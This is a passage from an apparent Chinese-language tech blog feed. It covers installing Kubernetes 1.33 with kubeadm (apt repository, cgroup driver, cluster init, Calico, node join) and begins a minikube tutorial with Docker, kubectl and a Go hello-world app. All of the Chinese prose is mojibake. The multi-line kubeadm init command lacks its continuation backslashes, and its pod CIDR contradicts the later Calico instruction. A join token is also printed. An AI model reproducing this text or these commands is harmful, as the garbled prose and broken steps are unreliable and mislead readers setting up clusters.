å®‰è£…çš„æ§åˆ¶å¹³é¢çš„ç‰ˆæœ¬ç›¸åŒ¹é…ã€‚ å¦‚æœä¸è¿™æ ·åšï¼Œåˆ™å­˜åœ¨å‘ç”Ÿç‰ˆæœ¬åå·®çš„é£é™©ï¼Œå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é¢„æ–™ä¹‹å¤–çš„é”™è¯¯å’Œé—®é¢˜ã€‚ ç„¶è€Œï¼Œæ§åˆ¶å¹³é¢ä¸ kubelet ä¹‹é—´å¯ä»¥å­˜åœ¨<strong>ä¸€ä¸ª</strong>æ¬¡è¦ç‰ˆæœ¬çš„åå·®ï¼Œä½† kubelet çš„ç‰ˆæœ¬ä¸å¯ä»¥è¶…è¿‡ API æœåŠ¡å™¨çš„ç‰ˆæœ¬ã€‚ ä¾‹å¦‚ï¼Œ1.7.0 ç‰ˆæœ¬çš„ kubelet å¯ä»¥å®Œå…¨å…¼å®¹ 1.8.0 ç‰ˆæœ¬çš„ API æœåŠ¡å™¨ï¼Œåä¹‹åˆ™ä¸å¯ä»¥ã€‚</p><blockquote><h4 id="è¯´æ˜ï¼š"><a href="#è¯´æ˜ï¼š" class="headerlink" title="è¯´æ˜ï¼š"></a>è¯´æ˜ï¼š</h4><p>æ¯ä¸ª Kubernetes å°ç‰ˆæœ¬éƒ½æœ‰ä¸€ä¸ªä¸“ç”¨çš„è½¯ä»¶åŒ…ä»“åº“ã€‚ å¦‚æœä½ æƒ³å®‰è£… 1.33 ä»¥å¤–çš„æ¬¡è¦ç‰ˆæœ¬ï¼Œè¯·å‚é˜…æ‰€éœ€æ¬¡è¦ç‰ˆæœ¬çš„å®‰è£…æŒ‡å—ã€‚</p></blockquote><p>ä»¥ä¸‹æŒ‡ä»¤é€‚ç”¨äº Kubernetes 1.33.</p><ol><li><p>æ›´æ–° <code>apt</code> åŒ…ç´¢å¼•å¹¶å®‰è£…ä½¿ç”¨ Kubernetes <code>apt</code> ä»“åº“æ‰€éœ€è¦çš„åŒ…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br><span class="hljs-meta prompt_"># </span><span class="language-bash">apt-transport-https å¯èƒ½æ˜¯ä¸€ä¸ªè™šæ‹ŸåŒ…ï¼ˆdummy packageï¼‰ï¼›å¦‚æœæ˜¯çš„è¯ï¼Œä½ å¯ä»¥è·³è¿‡å®‰è£…è¿™ä¸ªåŒ…</span><br>sudo apt-get install -y apt-transport-https ca-certificates curl gpg<br></code></pre></td></tr></table></figure></li><li><p>ä¸‹è½½ç”¨äº Kubernetes è½¯ä»¶åŒ…ä»“åº“çš„å…¬å…±ç­¾åå¯†é’¥ã€‚æ‰€æœ‰ä»“åº“éƒ½ä½¿ç”¨ç›¸åŒçš„ç­¾åå¯†é’¥ï¼Œå› æ­¤ä½ å¯ä»¥å¿½ç•¥URLä¸­çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å¦‚æœ `/etc/apt/keyrings` ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åº”åœ¨ curl å‘½ä»¤ä¹‹å‰åˆ›å»ºå®ƒï¼Œè¯·é˜…è¯»ä¸‹é¢çš„æ³¨é‡Šã€‚</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p -m 755 /etc/apt/keyrings</span><br>curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.33/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>è¯´æ˜ï¼š</p><p>åœ¨ä½äº Debian 12 å’Œ Ubuntu 22.04 çš„å‘è¡Œç‰ˆæœ¬ä¸­ï¼Œ<code>/etc/apt/keyrings</code> é»˜è®¤ä¸å­˜åœ¨ã€‚ åº”åœ¨ curl å‘½ä»¤ä¹‹å‰åˆ›å»ºå®ƒã€‚</p></blockquote><ol><li><p>æ·»åŠ  Kubernetes <code>apt</code> ä»“åº“ã€‚ è¯·æ³¨æ„ï¼Œæ­¤ä»“åº“ä»…åŒ…å«é€‚ç”¨äº Kubernetes 1.33 çš„è½¯ä»¶åŒ…ï¼› å¯¹äºå…¶ä»– Kubernetes æ¬¡è¦ç‰ˆæœ¬ï¼Œåˆ™éœ€è¦æ›´æ”¹ URL ä¸­çš„ Kubernetes æ¬¡è¦ç‰ˆæœ¬ä»¥åŒ¹é…ä½ æ‰€éœ€çš„æ¬¡è¦ç‰ˆæœ¬ ï¼ˆä½ è¿˜åº”è¯¥æ£€æŸ¥æ­£åœ¨é˜…è¯»çš„å®‰è£…æ–‡æ¡£æ˜¯å¦ä¸ºä½ è®¡åˆ’å®‰è£…çš„ Kubernetes ç‰ˆæœ¬çš„æ–‡æ¡£ï¼‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æ­¤æ“ä½œä¼šè¦†ç›– /etc/apt/sources.list.d/kubernetes.list ä¸­ç°å­˜çš„æ‰€æœ‰é…ç½®ã€‚(æŒ‰éœ€æ±‚æ›´æ¢å›½å†…é•œåƒ)</span><br>echo &#x27;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.33/deb/ /&#x27; | sudo tee /etc/apt/sources.list.d/kubernetes.list<br></code></pre></td></tr></table></figure></li><li><p>æ›´æ–° <code>apt</code> åŒ…ç´¢å¼•ï¼Œå®‰è£… kubeletã€kubeadm å’Œ kubectlï¼Œå¹¶é”å®šå…¶ç‰ˆæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y kubelet kubeadm kubectl<br>sudo apt-mark hold kubelet kubeadm kubectl<br></code></pre></td></tr></table></figure></li></ol><p>kubelet ç°åœ¨æ¯éš”å‡ ç§’å°±ä¼šé‡å¯ï¼Œå› ä¸ºå®ƒé™·å…¥äº†ä¸€ä¸ªç­‰å¾… kubeadm æŒ‡ä»¤çš„æ­»å¾ªç¯ï¼Œè¿™ä¸ç”¨å…³ç³»</p><h2 id="é…ç½®-cgroup-é©±åŠ¨ç¨‹åº"><a href="#é…ç½®-cgroup-é©±åŠ¨ç¨‹åº" class="headerlink" title="é…ç½® cgroup é©±åŠ¨ç¨‹åº"></a>é…ç½® cgroup é©±åŠ¨ç¨‹åº</h2><p>ç”±äº kubeadm æŠŠ kubelet è§†ä¸ºä¸€ä¸ª <a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/kubelet-integration">ç³»ç»ŸæœåŠ¡</a>æ¥ç®¡ç†ï¼Œ æ‰€ä»¥å¯¹åŸºäº kubeadm çš„å®‰è£…ï¼Œ æˆ‘ä»¬æ¨èä½¿ç”¨ <code>systemd</code> é©±åŠ¨ï¼Œ ä¸æ¨è kubelet <a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1">é»˜è®¤</a>çš„ <code>cgroupfs</code> é©±åŠ¨</p><p><strong>ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯äºŒè¿›åˆ¶å®‰è£…ä¸ä¼šç”Ÿæˆconfig.toml</strong></p><p>æˆ‘ä»¬è¿è¡Œç”Ÿæˆï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/containerd<br>containerd config default | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/containerd/config.toml<br></code></pre></td></tr></table></figure><h3 id="é…ç½®-kubelet-çš„-cgroup-é©±åŠ¨"><a href="#é…ç½®-kubelet-çš„-cgroup-é©±åŠ¨" class="headerlink" title="é…ç½® kubelet çš„ cgroup é©±åŠ¨"></a><strong>é…ç½® kubelet çš„ cgroup é©±åŠ¨</strong></h3><p>kubeadm æ”¯æŒåœ¨æ‰§è¡Œ <code>kubeadm init</code> æ—¶ï¼Œä¼ é€’ä¸€ä¸ª <code>KubeletConfiguration</code> ç»“æ„ä½“ã€‚ <code>KubeletConfiguration</code> åŒ…å« <code>cgroupDriver</code> å­—æ®µï¼Œå¯ç”¨äºæ§åˆ¶ kubelet çš„ cgroup é©±åŠ¨</p><p><strong>è¯´æ˜ï¼š</strong></p><p>åœ¨ç‰ˆæœ¬ 1.22 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰åœ¨ <code>KubeletConfiguration</code> ä¸­è®¾ç½® <code>cgroupDriver</code> å­—æ®µï¼Œ <code>kubeadm</code> ä¼šå°†å®ƒè®¾ç½®ä¸ºé»˜è®¤å€¼ <code>systemd</code>ã€‚</p><p>åœ¨ Kubernetes v1.28 ä¸­ï¼Œä½ å¯ä»¥ä»¥ Alpha åŠŸèƒ½å¯ç”¨ cgroup é©±åŠ¨çš„è‡ªåŠ¨æ£€æµ‹ã€‚ æœ‰å…³æ›´å¤šè¯¦æƒ…ï¼Œè¯·æŸ¥çœ‹ <a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/container-runtimes/#systemd-cgroup-driver">systemd cgroup é©±åŠ¨</a>ã€‚</p><p>è¿è¡Œ:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubelet --version<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æˆ‘ä»¬çš„ç‰ˆæœ¬æ˜¯<code>1.33</code>çš„</p><h1 id="ä½¿ç”¨-kubeadm-åˆ›å»ºé›†ç¾¤"><a href="#ä½¿ç”¨-kubeadm-åˆ›å»ºé›†ç¾¤" class="headerlink" title="ä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤"></a>ä½¿ç”¨ kubeadm åˆ›å»ºé›†ç¾¤</h1><p>æˆ‘ä»¬è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm init --apiserver-advertise-address=192.168.136.130 <br>--kubernetes-version v1.33.0 <br>--service-cidr=10.92.0.0/12 <br>--pod-network-cidr=10.220.0.0/16<br>--image-repository registry.aliyuncs.com/google_containers<br></code></pre></td></tr></table></figure><p>æ¥åˆå§‹åŒ–å¹³å°</p><p>å®‰è£… Pod ç½‘ç»œé™„åŠ ç»„ä»¶(é‡‡ç”¨calicoæˆ–è€…é€‰æ‹©<strong>Flannel</strong> å’Œ<strong>Cilium</strong>)</p><ol><li><p>ä¸‹è½½ Calico æ¸…å•æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://docs.projectcalico.org/manifests/calico.yaml <br></code></pre></td></tr></table></figure></li><li><p><strong>ä¿®æ”¹ CIDR é…ç½®</strong><br>åœ¨ YAML æ–‡ä»¶ä¸­æ‰¾åˆ° <code>192.168.0.0/16</code>ï¼ˆçº¦ 625 è¡Œï¼‰ï¼Œæ›¿æ¢ä¸ºåˆå§‹åŒ–æ—¶ <code>kubeadm init --pod-network-cidr=10.10.0.0/16</code> æŒ‡å®šçš„ CIDR æ®µ</p></li><li><p>éƒ¨ç½²ç½‘ç»œæ’ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f calico.yaml<br></code></pre></td></tr></table></figure></li></ol><p>æ‰§è¡Œ<code>init</code>æˆåŠŸåä¼šè¾“å‡ºnodeåŠ å…¥masterçš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm <span class="hljs-built_in">join</span> 192.168.136.130:6443 \<br>  --token 1sdami.5bq3wmthsjkxp4mh \<br>  --discovery-token-ca-cert-hash sha256:f8c244aee84f3436faad40ab8086f7b2ee27b86a5877c8f36abcb8ca6fdae009<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†nodeèŠ‚ç‚¹è¿è¡Œæ”¹å‘½ä»¤åŠ å…¥èŠ‚ç‚¹</p><p>èŠ‚ç‚¹åŠ å…¥åæˆ‘ä»¬å°±è¦æŸ¥çœ‹ï¼Œä½†æ˜¯<code>kubectl</code>æœ‰é™åˆ¶</p><p>è¦ä½¿é root ç”¨æˆ·å¯ä»¥è¿è¡Œ<code> kubectl</code>ï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œ å®ƒä»¬ä¹Ÿæ˜¯ <code>kubeadm init</code> è¾“å‡ºçš„ä¸€éƒ¨åˆ†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼Œå¦‚æœä½ æ˜¯ <code>root</code> ç”¨æˆ·ï¼Œåˆ™å¯ä»¥è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ<code>kubectl get nodes</code>å°±å¯ä»¥çœ‹åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl get nodes <br>NAME         STATUS   ROLES           AGE     VERSION<br>k8s-master   Ready    control-plane   18m     v1.33.0<br>k8s-node1    Ready    &lt;none&gt;          2m37s   v1.33.0<br></code></pre></td></tr></table></figure><h1 id="è¿ç”¨"><a href="#è¿ç”¨" class="headerlink" title="è¿ç”¨"></a>è¿ç”¨</h1><p>ç»™è‡ªå·±æŒ–å‘ğŸ¤“</p>]]></content>
    
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8så­¦ä¹ (åŸºäºminikubeæ¨¡æ‹Ÿ)</title>
    <link href="/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/"/>
    <url>/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘æœºç¼˜å·§åˆä¸‹å¯¹äºäº‘åŸç”Ÿæ¯”è¾ƒæ„Ÿå…´è¶£ï¼Œæœ¬æ–‡ä½¿ç”¨<code>minikube</code>æ¨¡æ‹Ÿk8sé›†ç¾¤ï¼Œä½¿ç”¨<code>kubectl</code>ç®¡ç†é›†ç¾¤</p><p>ç¯å¢ƒæ˜¯<code>Ubuntu22.04 TLS</code></p><p>ps:æœ¬æ–‡è½¬è½½è‡ª<a href="https://guangzhengli.com/courses/kubernetes">https://guangzhengli.com/courses/kubernetes</a> ï¼Œåªæ˜¯ä½œä¸ºä¸ªäººå­¦ä¹ </p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><h2 id="å®‰è£…docker"><a href="#å®‰è£…docker" class="headerlink" title="å®‰è£…docker"></a>å®‰è£…<code>docker</code></h2><p>ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬è‡ªåŠ¨å®‰è£…:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://test.docker.com -o test-docker.sh<br><span class="hljs-built_in">sudo</span> sh test-docker.sh<br></code></pre></td></tr></table></figure><p>ç”±äºminikubeçš„dockerå¼•æ“ä¸èƒ½æ˜¯rootæƒé™ï¼Œæ‰€æœ‰æˆ‘ä»¬å°†æ™®é€šç”¨æˆ·åŠ å…¥dockerç”¨æˆ·ç»„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…minikube"><a href="#å®‰è£…minikube" class="headerlink" title="å®‰è£…minikube"></a>å®‰è£…<code>minikube</code></h2><p>æˆ‘ä»¬ä½¿ç”¨ **<a href="https://minikube.sigs.k8s.io/docs/start/?arch=/linux/x86-64/stable/debian+package">Debian è½¯ä»¶åŒ…</a>**å®‰è£…æœ€æ–°ç‰ˆçš„æœ€æ–°çš„ minikube <strong>ç¨³å®š</strong>ç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb<br><span class="hljs-built_in">sudo</span> dpkg -i minikube_latest_amd64.deb<br></code></pre></td></tr></table></figure><h2 id="å¯åŠ¨minikube"><a href="#å¯åŠ¨minikube" class="headerlink" title="å¯åŠ¨minikube"></a>å¯åŠ¨<code>minikube</code></h2><p>æˆ‘ä»¬ä½¿ç”¨<code>minikube start</code>å›å¯åŠ¨ä¸€ä¸ªå•èŠ‚ç‚¹çš„ Kubernetes é›†ç¾¤</p><p><code>minikube start</code>å‚æ•°è§£é‡Š:</p><blockquote><p><code>--driver=&lt;driver&gt;</code>ï¼šæŒ‡å®šä½¿ç”¨çš„é©±åŠ¨ç¨‹åºï¼Œå¦‚ <code>docker</code>ã€<code>virtualbox</code>ã€<code>hyperv</code> ç­‰,ä¸æŒ‡å®šä¼šè‡ªåŠ¨è¯†åˆ«ã€‚</p><p><code>--kubernetes-version=&lt;version&gt;</code>ï¼šæŒ‡å®š Kubernetes çš„ç‰ˆæœ¬ï¼Œä¸æŒ‡å®šä¼šè‡ªåŠ¨è¯†åˆ«ã€‚</p><p><code>--memory=&lt;MB&gt;</code> å’Œ <code>--cpus=&lt;num&gt;</code>ï¼šåˆ†é…ç»™é›†ç¾¤çš„å†…å­˜å’Œ CPU æ ¸å¿ƒæ•°ï¼Œé»˜è®¤æ˜¯2200mbå’Œ2æ ¸ã€‚</p><p><code>--image-repository=&lt;url&gt;</code>ï¼šæŒ‡å®šé•œåƒä»“åº“åœ°å€ï¼Œé€‚ç”¨äºç½‘ç»œå—é™çš„ç¯å¢ƒã€‚å»ºè®®æ›´æ¢å›½å†…èŠ‚ç‚¹</p><p><code>--container-runtime=&lt;runtime&gt;</code>ï¼šé€‰æ‹©å®¹å™¨è¿è¡Œæ—¶ï¼Œå¦‚ <code>docker</code>ã€<code>containerd</code> æˆ– <code>cri-o</code>ä¸æŒ‡å®šä¼šè‡ªåŠ¨è¯†åˆ« </p><p><code>--extra-config=&lt;component.key=value&gt;</code>ï¼šä¸º Kubernetes ç»„ä»¶è®¾ç½®é¢å¤–çš„é…ç½®å‚æ•°ã€‚</p></blockquote><p>ä½¿ç”¨<code>minikube status</code>æŸ¥çœ‹é›†ç¾¤çŠ¶æ€</p><p><strong>minikube å‘½ä»¤é€ŸæŸ¥</strong></p><p><code>minikube stop</code> ä¸ä¼šåˆ é™¤ä»»ä½•æ•°æ®ï¼Œåªæ˜¯åœæ­¢ VM å’Œ k8s é›†ç¾¤ã€‚</p><p><code>minikube delete</code> åˆ é™¤æ‰€æœ‰ minikube å¯åŠ¨åçš„æ•°æ®ã€‚</p><p><code>minikube ip</code> æŸ¥çœ‹é›†ç¾¤å’Œ docker enginer è¿è¡Œçš„ IP åœ°å€ã€‚</p><p><code>minikube pause</code> æš‚åœå½“å‰çš„èµ„æºå’Œ k8s é›†ç¾¤</p><p><code>minikube status</code> æŸ¥çœ‹å½“å‰é›†ç¾¤çŠ¶æ€</p><h2 id="å®‰è£…-kubectl"><a href="#å®‰è£…-kubectl" class="headerlink" title="å®‰è£… kubectl"></a>å®‰è£… kubectl</h2><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼šæˆ–è€…å®‰è£…<a href="https://kubernetes.io/zh-cn/docs/tasks/tools/install-kubectl-linux/#install-using-native-package-management">Debianå‘è¡Œç‰ˆ</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -LO <span class="hljs-string">&quot;https://dl.k8s.io/release/<span class="hljs-subst">$(curl -L -s https://dl.k8s.io/release/stable.txt)</span>/bin/linux/amd64/kubectl&quot;</span> <span class="hljs-comment">#ä¸‹è½½æœ€æ–°ç‰ˆ</span><br><span class="hljs-built_in">sudo</span> install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl <span class="hljs-comment">#å®‰è£…kubectl</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæµ‹è¯•ï¼Œä»¥ä¿éšœä½ å®‰è£…çš„ç‰ˆæœ¬æ˜¯æœ€æ–°çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl version --client<br></code></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹ç‰ˆæœ¬çš„è¯¦ç»†ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl version --client --output=yaml<br></code></pre></td></tr></table></figure><p>é€šè¿‡è·å–é›†ç¾¤çŠ¶æ€çš„æ–¹æ³•ï¼Œæ£€æŸ¥æ˜¯å¦å·²æ°å½“åœ°é…ç½®äº† <code>kubectl</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl cluster-info<br></code></pre></td></tr></table></figure><p>å¦‚æœè¿”å›ä¸€ä¸ª URLï¼Œåˆ™æ„å‘³ç€ kubectl æˆåŠŸåœ°è®¿é—®åˆ°äº†ä½ çš„é›†ç¾¤ã€‚</p><h2 id="æ³¨å†Œ-docker-hub-è´¦å·ç™»å½•"><a href="#æ³¨å†Œ-docker-hub-è´¦å·ç™»å½•" class="headerlink" title="æ³¨å†Œ docker hub è´¦å·ç™»å½•"></a>æ³¨å†Œ docker hub è´¦å·ç™»å½•</h2><p>å› ä¸ºé»˜è®¤ minikube ä½¿ç”¨çš„é•œåƒåœ°å€æ˜¯ DockerHubï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦åœ¨ <a href="https://hub.docker.com/">DockerHub</a> ä¸­æ³¨å†Œè´¦å·ï¼Œå¹¶ä¸”ä½¿ç”¨ login å‘½ä»¤ç™»å½•è´¦å·ã€‚</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker login</span><br></code></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œé‡‡ç”¨aliyunçš„é•œåƒæ‰˜ç®¡å¹³æ›¿</p><h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><p>æˆ‘ä»¬çš„æ—…ç¨‹ä»ä¸€æ®µä»£ç å¼€å§‹ã€‚æ–°å»ºä¸€ä¸ª <code>main.go</code> æ–‡ä»¶ï¼Œå¤åˆ¶ä¸‹é¢çš„ä»£ç åˆ°æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v1] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ä¸€ä¸²ç”¨ <a href="https://go.dev/">Go</a> å†™çš„ä»£ç ï¼Œä»£ç é€»è¾‘éå¸¸çš„ç®€å•ï¼Œé¦–å…ˆå¯åŠ¨ HTTP æœåŠ¡å™¨ï¼Œç›‘å¬ <code>3000</code> ç«¯å£ï¼Œå½“è®¿é—®è·¯ç”± <code>/</code>çš„æ—¶å€™ è¿”å›å­—ç¬¦ä¸² <code>[v1] Hello, Kubernetes!</code>ã€‚</p><p>åœ¨ä»¥å‰ï¼Œå¦‚æœä½ æƒ³å°†è¿™æ®µä»£ç è¿è¡Œèµ·æ¥å¹¶æµ‹è¯•ä¸€ä¸‹ã€‚ä½ é¦–å…ˆéœ€è¦æ‡‚å¾—å¦‚ä½•ä¸‹è½½ golang çš„å®‰è£…åŒ…è¿›è¡Œå®‰è£…ï¼Œæ¥ç€éœ€è¦æ‡‚å¾— <code>golang module</code> çš„åŸºæœ¬ä½¿ç”¨ï¼Œæœ€åè¿˜éœ€è¦äº†è§£ golang çš„ç¼–è¯‘å’Œè¿è¡Œå‘½ä»¤ï¼Œæ‰èƒ½å°†è¯¥ä»£ç è¿è¡Œèµ·æ¥ã€‚ç”šè‡³åœ¨è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šå› ä¸ºç¯å¢ƒå˜é‡é—®é¢˜ã€æ“ä½œç³»ç»Ÿé—®é¢˜ã€å¤„ç†å™¨æ¶æ„ç­‰é—®é¢˜å¯¼è‡´ç¼–è¯‘æˆ–è¿è¡Œå¤±è´¥ã€‚</p><p>ä½†æ˜¯é€šè¿‡ Container (å®¹å™¨) æŠ€æœ¯ï¼Œåªéœ€è¦ä¸Šé¢çš„ä»£ç ï¼Œé™„å¸¦ç€å¯¹åº”çš„å®¹å™¨ <code>Dockerfile</code> æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ å°±ä¸éœ€è¦ golang çš„ä»»ä½•çŸ¥è¯†ï¼Œä¹Ÿèƒ½å°†ä»£ç é¡ºåˆ©è¿è¡Œèµ·æ¥ã€‚</p><blockquote><p>Container (å®¹å™¨) æ˜¯ä¸€ç§æ²™ç›’æŠ€æœ¯ã€‚å®ƒæ˜¯åŸºäº Linux ä¸­ Namespace &#x2F; Cgroups &#x2F; chroot ç­‰æŠ€æœ¯ç»“åˆè€Œæˆï¼Œæ›´å¤šæŠ€æœ¯ç»†èŠ‚å¯ä»¥å‚çœ‹è¿™ä¸ªè§†é¢‘ <a href="https://www.youtube.com/watch?v=8fi7uSYlOdc">å¦‚ä½•è‡ªå·±å®ç°ä¸€ä¸ªå®¹å™¨</a>ã€‚</p></blockquote><p>ä¸‹é¢å°±æ˜¯ Go ä»£ç å¯¹åº”çš„ <code>Dockerfile</code>ï¼Œç®€å•çš„æ–¹æ¡ˆæ˜¯ç›´æ¥ä½¿ç”¨ golang çš„ alpine é•œåƒæ¥æ‰“åŒ…ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä»¬åç»­ç»ƒä¹ éœ€è¦é¢‘ç¹çš„æ¨é€é•œåƒåˆ° DockerHub å’Œæ‹‰å–é•œåƒåˆ° k8s 